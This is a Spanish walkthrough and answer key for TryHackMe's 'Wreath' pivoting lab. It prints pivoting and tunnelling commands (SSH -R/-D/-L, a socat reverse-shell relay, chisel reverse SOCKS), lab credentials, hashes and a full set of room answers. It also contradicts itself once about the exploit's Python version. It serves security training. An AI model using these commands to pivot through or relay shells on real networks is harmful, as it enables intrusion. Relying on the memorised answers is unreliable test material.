# Wreath - Network

| **Dificultad** | Easy |
| **Tipo** | Sala práctica (red / pivoting) |
| **Slug** | `wreath` |
| **Link** | [TryHackMe](https://tryhackme.com/room/wreath) |
| **Sección** | 01 Level Easy |
| **Fuente** | TryHackMe |
| **Componentes** | nmap / Webmin / CVE-2019-15107 / pivoting / proxychains / SSH (L/R/-fN) / socat / chisel / sshuttle / Gitstack (EDB 43777) / Empire / WinRM / AMSI / PrintSpoofer / exfiltración |
| **Impacto** | Sala donde tras comprometer un host (Webmin 1.890 con CVE-2019-15107 como root y una `id_rsa`), se aprende pivoting de red real con proxychains, SSH local/remote/forward, socat, chisel y sshuttle; luego se descubre y explota un servidor Gitstack (exploit EDB 43777, usuario `NT AUTHORITY\SYSTEM`), se pivota de nuevo con Empire, se gana acceso WinRM al host web (`WREATH-PC`), se evade antivirus y se escalan privilegios con PrintSpoofer/SeImpersonatePrivilege, terminando con la exfiltración de hashes NT. |

---

**Contexto:** Con nmap (primeros 15000 puertos) se detectan 4 abiertos en CentOS; el sitio redirige a `https://thomaswreath.thm` (teléfono de Thomas: `+447821548812`) donde corre Webmin/MiniServ `1.890` (vulnerable a `CVE-2019-15107`). El servicio corre como `root`; de la máquina se extrae el hash de root (`$6$i9vT8tk3...`) y la clave privada en `/root/.ssh/id_rsa`. La cadena de pivoting: entender **Tunnelling** frente a pivoting y `portfwd`, uso de `/etc/resolv.conf` y del hosts de Windows, ping-sweep de la submalla (for loop con bash), configuración de proxychains (`socks4 127.0.0.1 4242`) y SSH (`-fN`, `-D`, `-R`, `-L`), socat (`reuseaddr`), chisel y sshuttle. En la red interna se hallan 2 hosts activos (últimos octetos `100,150`); el 150 no filtra y expone `80,3389,5985`, donde corre **Gitstack** (default creds no válidas; exploit Python2 EDB `43777` con cookie `csrftoken`). El host `git-serv` es Windows (`NT AUTHORITY\SYSTEM`), con hash del Administrador (`37db...`) y del usuario Thomas (`02d90...`, contraseña `i<3ruby`). Usando Empire se ejecuta `shell whoami` dentro del agente. El siguiente host (`80,3389`) corre `PHP 7.4.11` con el repo `C:\Gitstack\Repositories\Website.git`, protegido por Basic Auth y con subida de `jpg,jpeg,png,gif`. Para evadir AV: On-Disk/In-Memory evasion, AMSI, detección estática/behavioral (`Behavioural`), y proteger payload con `Password`. Ya en `WREATH-PC` (usuario `wreath-pc\thomas`) se ven privilegios como `SeImpersonatePrivilege` (PrintSpoofer/Potato), el servicio `SystemExplorerHelpService` corre como sistema, y se exfiltran los hashes NT del Administrador (`a05c3c...`); HTTPS es preferido por su `Encryption`.

## Solucionario

### Task 1: Reconocimiento del objetivo

**Explicación:** Escaneo de los primeros 15000 puertos (4 abiertos), OS CentOS, redirección a `https://thomaswreath.thm`, número de Thomas, versión de Webmin (`MiniServ 1.890`), CVE (`CVE-2019-15107`), usuario del servicio (`root`), hash de root y ruta de la clave privada.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuántos de los primeros 15000 puertos están abiertos en el objetivo? | `4` |
| 2 | ¿Qué SO cree Nmap que está corriendo? | `CentOS` |
| 3 | Abre la IP en tu navegador: ¿a qué sitio intenta redirigirte el servidor? | `https://thomaswreath.thm` |
| 4 | Lee el texto de la página. ¿Cuál es el número de móvil de Thomas? | `+447821548812` |
| 5 | Vuelve a tu escaneo de servicios: ¿qué versión de servidor detecta Nmap aquí? | `MiniServ 1.890 (Webmin httpd)` |
| 6 | ¿Cuál es el número CVE de este exploit? | `CVE-2019-15107` |
| 7 | ¿Con qué usuario estaba ejecutándose el servidor? | `root` |
| 8 | ¿Cuál es el hash de la contraseña del usuario root? | `$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1` |
| 9 | ¿Cuál es la ruta completa de este archivo? | `/root/.ssh/id_rsa` |

### Task 2: Conceptos de pivoting

**Explicación:** Diferencia entre túnel (información oculta dentro de otro protocolo), pivoting y el comando `portfwd` de Meterpreter; rutas de los ficheros DNS y hosts en Linux/Windows.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué tipo de pivoting crea un canal por el que la información puede viajar oculta dentro de otro protocolo? | `Tunnelling` |
| 2 | Investigación: ¿qué comando de Meterpreter se usa para crear un port forward? | `portfwd` |
| 3 | ¿Cuál es la ruta absoluta del archivo con las entradas DNS en Linux? | `/etc/resolv.conf` |
| 4 | ¿Cuál es la ruta absoluta del archivo hosts en Windows? | `C:\Windows\System32\drivers\etc\hosts` |

### Task 3: Proxychains y comprobación de red

**Explicación:** Ping-sweep con bash sobre `172.16.0.x/24`, configuración de proxychains (`socks4 127.0.0.1 4242`), uso de `proxychains telnet`, elección de FoxyProxy para webapp, tipo de port forward (L), switch `-fN` y la pareja de claves `ssh-keygen`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cómo podrías ver qué IP están activas y permiten ICMP echo en la red 172.16.0.x/24 usando Bash? | `for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done` |
| 2 | ¿Qué línea pondrías en tu config de proxychains para redirigir a través de un proxy socks4 en 127.0.0.1:4242? | `socks4 127.0.0.1 4242` |
| 3 | ¿Qué comando usarías para hacer telnet a través del proxy hacia 172.16.0.100:23? | `proxychains telnet 172.16.0.100 23` |
| 4 | Para conectarte a una webapp dentro de una red aislada, ¿qué herramienta es más apropiada: Proxychains (PC) o FoxyProxy (FP)? | `FP` |
| 5 | Si te conectas a un servidor SSH desde tu máquina atacante para crear un port forward, ¿sería un port forward local (L) o remoto (R)? | `L` |
| 6 | ¿Qué combinación de switches se usa para dejar un port forward o túnel SSH en segundo plano? | `-fN` |
| 7 | ¿Es buena idea meter nuestra propia contraseña en la máquina remota para montar un proxy inverso, Aye o Nay? | `Nay` |
| 8 | ¿Qué comando usarías para crear un par de claves SSH desechables para una conexión inversa? | `ssh-keygen` |

### Task 4: Port forwarding con SSH

**Explicación:** Comandos SSH de forward: `-R` (reverse), `-D` (proxy dinámico) y `-L` (local), todos con `-fN` para background.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Comando para montar un reverse portforward desde el puerto 22 de 172.16.0.100 al 2222 de tu máquina local (usuario "kali", keyfile id_rsa, en segundo plano). | `ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN` |
| 2 | ¿Qué comando usarías para montar un proxy dinámico en el puerto 8000 hacia user@target.thm en segundo plano? | `ssh -D 8000 user@target.thm -fN` |
| 3 | Con acceso SSH a 172.16.0.50 con una web interna en 127.0.0.1:80, ¿cómo la forwardeas al puerto 8000 de tu máquina? (usuario "user", en segundo plano). | `ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN` |

### Task 5: Socat

**Explicación:** Conversión de llaves con `puttygen`, opción `reuseaddr` y redirecciones con socat (entrante y entrante con fork).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué herramienta convierte llaves OpenSSH a llaves estilo PuTTY? | `puttygen` |
| 2 | ¿Qué opción de socat permite reutilizar el mismo puerto de escucha para más de una conexión? | `reuseaddr` |
| 3 | Con IP atacante 172.16.0.200, ¿cómo rediriges una reverse shell al puerto TCP 443 de tu máquina con una copia estática de socat en el directorio actual? | `./socat tcp-l:8000 tcp:172.16.0.200:443` |
| 4 | ¿Qué comando forwardea el puerto TCP 2222 de un servidor comprometido a 172.16.0.100:22 (socat estático, en segundo plano)? | `./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &` |

### Task 6: Chisel

**Explicación:** Servidor y clientes chisel: reverse socks, forward R y L.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué comando inicia un servidor chisel para conexión inversa en tu máquina atacante? | `./chisel server -p 4242 --reverse` |
| 2 | Desde un host comprometido (IP 172.16.0.200), ¿cómo conectas al servidor con un proxy SOCKS en segundo plano? | `./chisel client 172.16.0.200:4242 R:socks &` |
| 3 | ¿Cómo forwardeas 172.16.0.100:3306 a tu puerto 33060 (puerto de escucha 1337, en segundo plano)? | `./chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &` |
| 4 | Con chisel server en 172.16.0.5:4444, ¿cómo creas un portforward local abriendo el 8000 y enlazando a 172.16.0.10:80? | `./chisel client 172.16.0.5:4444 8000:172.16.0.10:80` |

### Task 7: SSHuttle

**Explicación:** Conexión transparente con sshuttle y uso de la keyfile.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cómo usarías sshuttle para conectarte a 172.16.20.7 (usuario "pwned") con la submalla 172.16.0.0/16? | `sshuttle -r pwned@172.16.20.7 172.16.0.0/16` |
| 2 | ¿Qué switch (y argumento) usarías para que sshuttle use la keyfile "priv_key" en el directorio actual? | `--ssh-cmd "ssh -i priv_key"` |

### Task 8: Descubrimiento del siguiente host

**Explicación:** El error de sshuttle se arregla excluyendo el host propio (`-x 172.16.0.100`). El escaneo de la red descubre 2 hosts activos (últimos octetos `100,150`); el `150` no filtra todos los puertos y expone `80,3389,5985`, siendo HTTP el servicio más probablemente explotable.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué switch (y argumento) podrías usar para arreglar este error? | `-x 172.16.0.100` |
| 2 | Excluyendo los hosts fuera de alcance y el actual (.200), ¿cuántos hosts activos se descubrieron en la red? | `2` |
| 3 | En orden ascendente, ¿cuáles son los últimos octetos de las IPv4 de esos hosts? | `100,150` |
| 4 | Escanea los hosts: ¿cuál no devuelve estado "filtered" en todos los puertos (solo último octeto)? | `150` |
| 5 | ¿Qué puertos TCP (ascendente, separados por comas) por debajo de 15000 están abiertos en el objetivo restante? | `80,3389,5985` |
| 6 | Asumiendo las suposiciones de Nmap, ¿cuál de los servicios encontrados es más probable que tenga una vulnerabilidad explotable? | `HTTP` |

### Task 9: Explotación de Gitstack

**Explicación:** El servicio es **Gitstack** (credenciales por defecto no válidas: Nay), con exploit Python3 de EDB `43777` para la versión 2.3.10, escrito el `18.01.2018` en Python 2, que usa la cookie `csrftoken` en el POST.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el nombre del programa que ejecuta el servicio? | `Gitstack` |
| 2 | ¿Funcionan estas credenciales por defecto (Aye/Nay)? | `Nay` |
| 3 | Hay un exploit RCE en Python para la versión 2.3.10 del servicio. ¿Cuál es el ID EDB de este exploit? | `43777` |
| 4 | Mira la información al inicio del script. ¿En qué fecha se escribió este exploit? | `18.01.2018` |
| 5 | Teniendo esto en cuenta, ¿está escrito en Python2 o Python3? | `Python2` |
| 6 | Para confirmar: ¿cuál es el nombre de la cookie del POST de la línea 74 del exploit? | `csrftoken` |

### Task 10: Acceso al git server

**Explicación:** El host (`git-serv`) es Windows, el servidor corre como `NT AUTHORITY\SYSTEM` y ninguna conexión llega al listener final (`0`).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el hostname de este objetivo? | `git-serv` |
| 2 | ¿Qué sistema operativo tiene este objetivo? | `Windows` |
| 3 | ¿Con qué usuario se ejecuta el servidor? | `NT AUTHORITY\SYSTEM` |
| 4 | ¿Cuántas llegan al listener que espera? | `0` |

### Task 11: Credenciales y Empire

**Explicación:** Hashes y contraseñas obtenidos (Administrador `37db...`, Thomas NTLM `02d90...` con password `i<3ruby`); no se puede recuperar un agente directamente desde el git server, así que el comando en Empire para ejecutar `whoami` es `shell whoami`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el hash de la contraseña del Administrador? | `37db630168e5f82aafa8461e05c6bbd1` |
| 2 | ¿Cuál es el hash NTLM del usuario "Thomas"? | `02d90eda8f6b6b06c32d5f207831101f` |
| 3 | ¿Cuál es la contraseña de Thomas? | `i<3ruby` |
| 4 | ¿Podemos recuperar un agente directamente del git server (Aye/Nay)? | `Nay` |
| 5 | En la CLI de Empire, ¿cómo ejecutaríamos el comando `whoami` dentro de un agente? | `shell whoami` |

### Task 12: Investigación del sitio objetivo

**Explicación:** El host web abre `80,3389`, corre `PHP 7.4.11`, aloja `C:\Gitstack\Repositories\Website.git`, habla de "Neighbourhood Watch Meetings", está protegido por Basic Auth y acepta las extensiones `jpg,jpeg,png,gif`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Escanea los 50 primeros puertos del último host de la Task 17. ¿Qué puertos están abiertos? | `80,3389` |
| 2 | Usando Wappalyzer (Firefox/Chrome), identifica el lenguaje de servidor (con versión) del sitio. | `PHP 7.4.11` |
| 3 | Usa tu acceso WinRM para mirar el Git Server. ¿Cuál es la ruta absoluta al directorio Website.git? | `C:\Gitstack\Repositories\Website.git` |
| 4 | ¿Qué tiene que llamar Thomas a la Sra. Walker? | `Neighbourhood Watch Meetings` |
| 5 | Aparte del filtro, ¿qué método de protección es probable que impida acceder a esta página? | `Basic Auth` |
| 6 | ¿Qué extensiones se aceptan? | `jpg,jpeg,png,gif` |

### Task 13: Evasión de antivirus

**Explicación:** Conceptos de evasión: On-Disk Evasion (subir antes de ejecutar), AMSI (Anti-Malware Scan Interface) afecta a In-Memory Evasion, detección dinámica/heurística = Behavioural, análisis estático con hashes por trozos, reglas pre-definidas y proteger con `Password` el archivo para impedir que el AV lo ejecute.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué categoría de evasión cubre subir un archivo al almacenamiento del objetivo antes de ejecutarlo? | `On-Disk Evasion` |
| 2 | ¿Qué significa AMSI? | `Anti-Malware Scan Interface` |
| 3 | ¿A qué categoría de evasión afecta AMSI? | `In-Memory Evasion` |
| 4 | ¿Qué otro nombre se usa para los métodos de detección dinámica/heurística? | `Behavioural` |
| 5 | Si un AV divide el programa en trozos pequeños y los hashea comprobándolos contra una base de datos, ¿es un método estático o dinámico? | `Static` |
| 6 | Al analizar dinámicamente un fichero sospechoso línea a línea, ¿contra qué comprueba el AV su comportamiento? | `Pre-defined rules` |
| 7 | ¿Qué se puede añadir a un fichero para asegurar que solo un usuario pueda abrirlo (evitando que el AV ejecute el payload)? | `Password` |

### Task 14: Acceso y escalada en WREATH-PC

**Explicación:** El host es `WREATH-PC`, el usuario actual `wreath-pc\thomas`, el comando `certutil.exe` responde "CertUtil: -dump command completed successfully.", el privilegio famoso para PrintSpoofer/Potato es `SeImpersonatePrivilege`, el servicio relevante es `SystemExplorerHelpService` (corre como sistema: Aye).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el Host Name del objetivo? | `WREATH-PC` |
| 2 | ¿Cuál es nuestro usuario actual (incluye el dominio)? | `wreath-pc\thomas` |
| 3 | ¿Qué salida obtienes al ejecutar `certutil.exe`? | `CertUtil: -dump command completed successfully.` |
| 4 | Investigación: uno de los privilegios se usa en los exploits de la serie PrintSpoofer y Potato. ¿Cuál es? | `SeImpersonatePrivilege` |
| 5 | ¿Cuál es el Name (segunda columna) de este servicio? | `SystemExplorerHelpService` |
| 6 | ¿Está corriendo el servicio con la cuenta del sistema local (Aye/Nay)? | `Aye` |

### Task 15: Exfiltración y cierre

**Explicación:** FTP no es buen protocolo para exfiltrar (Nay), HTTPS se prefiere por su `Encryption` y el hash NT final del Administrador es `a05c3c...`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Es FTP un buen protocolo para exfiltrar datos en una red moderna (Aye/Nay)? | `Nay` |
| 2 | ¿Por qué razón se prefiere HTTPS sobre HTTP durante la exfiltración? | `Encryption` |
| 3 | ¿Cuál es el hash NT del Administrador de este objetivo? | `a05c3c807ceeb48c47252568da284cd2` |

---

**Metodología:** nmap (15000 puertos) → identificación de Webmin y CVE → foothold vía Webmin/explotación → extracción de id_rsa y hashes → pivoting (proxychains/SSH/socat/chisel/sshuttle) → descubrimiento de la red interna → explotación de Gitstack → credenciales y Empire → WinRM/PHP → evasión de AV → escalada con SeImpersonatePrivilege → exfiltración de hashes NT.
**Learning chain:** compromiso inicial → túnel SSH → pivoting completo → segundo salto (Gitstack) → Empire → tercer host (web) → evasión y escalada → exfiltración.
**MITRE ATT&CK:** T1046 (Network Service Discovery), T1190 (Exploit Public-Facing Application), T1090 (Proxy), T1572 (Protocol Tunneling), T1021.006 (Windows Remote Management), T1003.002 (Security Account Manager), T1548 (Abuse Elevation Control Mechanism)
**Fuente:** [TryHackMe - Wreath](https://tryhackme.com/room/wreath)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
